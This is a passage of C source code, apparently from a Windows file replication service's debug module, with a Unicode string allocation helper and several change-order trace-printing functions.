        // If the above took an exception make sure we drop the lock.
        // If we still have it.
        //
        if (HaveLock) {DebUnLock();}
    }
}




VOID
FrsAllocUnicodeString(
    PUNICODE_STRING Ustr,
    PWCHAR          InternalBuffer,
    PWCHAR          Wstr,
    USHORT          WstrLength
    )
/*++

Routine Description:

    Initialize a unicode string with the contents of Wstr if the two are
    not already the same.  If the length of the new string is greater than
    the buffer space currently allocated in Ustr then allocate a new
    buffer for Ustr.  In some structures the initial Ustr buffer allocation
    is allocated as part of the initial structure allocation.  The address
    of this internal buffer is passed so it can be compared with the address
    in Ustr->Buffer.  If they match then no free memory call is made on
    the Ustr->Buffer address.

Arguments:

    Ustr           -- The UNICODE_STRING to init.

    InternalBuffer -- A ptr to the internal buffer address that was preallocated
                      with the containing struct.   If there was no internal
                      buffer pass NULL.

    Wstr           -- The new WCHAR string.

    WstrLength     -- The length of the new string in bytes not including the
                       trailing UNICODE_NULL.

Return Value:

    None.


--*/

{
#undef DEBSUB
#define  DEBSUB  "FrsAllocUnicodeString:"
    //
    // See if the name part changed and if so save it.
    //
    if ((Ustr->Length != WstrLength) ||
        (wcsncmp(Ustr->Buffer, Wstr, Ustr->Length/sizeof(WCHAR)) != 0)) {
        //
        // If string to big (including space for a NULL), alloc new buffer.
        //
        if (WstrLength >= Ustr->MaximumLength) {
            //
            // Alloc room for new one, freeing the old one if not internal alloc.
            //
            if ((Ustr->Buffer != InternalBuffer) && (Ustr->Buffer != NULL)) {
                FrsFree(Ustr->Buffer);
            }
            Ustr->MaximumLength = WstrLength+2;
            Ustr->Buffer = FrsAlloc(WstrLength+2);
        }

        //
        // Copy in new name. Length does not include the trailing NULL at end.
        //
        CopyMemory(Ustr->Buffer, Wstr, WstrLength);
        Ustr->Buffer[WstrLength/2] = UNICODE_NULL;
        Ustr->Length = WstrLength;
    }

}





#define  CO_TRACE_FORMAT       ":: CoG %08x, CxtG %08x, FV %5d, FID %08x %08x, FN: %-15ws, [%s]\n"
#define  REPLICA_TRACE_FORMAT  ":S:Adr %08x, Cmd  %04x, Flg %04x, %ws (%d),  %s, Err %d [%s]\n"
#define  REPLICA_TRACE_FORMAT2 ":S:Adr %08x,                      %ws (%d),  %s,        [%s]\n"
#define  CXTION_TRACE_FORMAT   ":X: %08x, Nam %ws, Sta %s%s, %ws (%d),  %s, Err %d [%s]\n"

VOID
ChgOrdTraceCoe(
    IN ULONG Severity,
    IN PCHAR Debsub,
    IN ULONG uLineNo,
    IN PCHANGE_ORDER_ENTRY Coe,
    IN PCHAR  Text
    )

/*++

Routine Description:

    Print a change order trace record using the change order entry and the
    Text string.

Arguments:


Return Value:

    None

--*/
{
#undef DEBSUB
#define DEBSUB  "ChgOrdTraceCoe:"

    ULONGLONG  FileRef;

    FileRef = (Coe != NULL) ? Coe->FileReferenceNumber : QUADZERO;

    DebPrint(Severity,
             (PUCHAR) CO_TRACE_FORMAT,
             Debsub,
             uLineNo,
             (Coe != NULL) ? Coe->Cmd.ChangeOrderGuid.Data1 : 0,
             (Coe != NULL) ? Coe->Cmd.CxtionGuid.Data1 : 0,
             (Coe != NULL) ? Coe->Cmd.FileVersionNumber : 0,
             PRINTQUAD(FileRef),
             (Coe != NULL) ? Coe->Cmd.FileName : L"<Null Coe>",
             Text);

}


VOID
ChgOrdTraceCoeW(
    IN ULONG Severity,
    IN PCHAR Debsub,
    IN ULONG uLineNo,
    IN PCHANGE_ORDER_ENTRY Coe,
    IN PCHAR  Text,
    IN ULONG  WStatus
    )

/*++

Routine Description:

    Print a change order trace record using the change order entry and the
    Text string and Win32 status.

Arguments:


Return Value:

    None

--*/
{
#undef DEBSUB
#define DEBSUB  "ChgOrdTraceCoeW:"


    CHAR Tstr[256];

    _snprintf(Tstr, sizeof(Tstr), "%s (%s)", Text, ErrLabelW32(WStatus));
    Tstr[sizeof(Tstr)-1] = '\0';


    ChgOrdTraceCoe(Severity, Debsub, uLineNo, Coe, Tstr);

}


VOID
ChgOrdTraceCoeF(
    IN ULONG Severity,
    IN PCHAR Debsub,
    IN ULONG uLineNo,
    IN PCHANGE_ORDER_ENTRY Coe,
    IN PCHAR  Text,
    IN ULONG  FStatus
    )

/*++

Routine Description:

    Print a change order trace record using the change order entry and the
    Text string and Frs Error status.

Arguments:


Return Value:

    None

--*/
{
#undef DEBSUB
#define DEBSUB  "ChgOrdTraceCoeF:"


    CHAR Tstr[128];

    _snprintf(Tstr, sizeof(Tstr), "%s (%s)", Text, ErrLabelFrs(FStatus));
    Tstr[sizeof(Tstr)-1] = '\0';


    ChgOrdTraceCoe(Severity, Debsub, uLineNo, Coe, Tstr);

}



VOID
ChgOrdTraceCoeX(
    IN ULONG Severity,
    IN PCHAR Debsub,
    IN ULONG uLineNo,
    IN PCHANGE_ORDER_ENTRY Coe,
    IN PCHAR  Text,
    IN ULONG  Data
    )

/*++

Routine Description:

    Print a change order trace record using the change order entry and the
    Text string and Win32 status.

Arguments:


Return Value:

    None

--*/
{
#undef DEBSUB
#define DEBSUB  "ChgOrdTraceCoeX:"


    CHAR Tstr[256];

    _snprintf(Tstr, sizeof(Tstr), "%s (%08x)", Text, Data);
    Tstr[sizeof(Tstr)-1] = '\0';


    ChgOrdTraceCoe(Severity, Debsub, uLineNo, Coe, Tstr);

}


VOI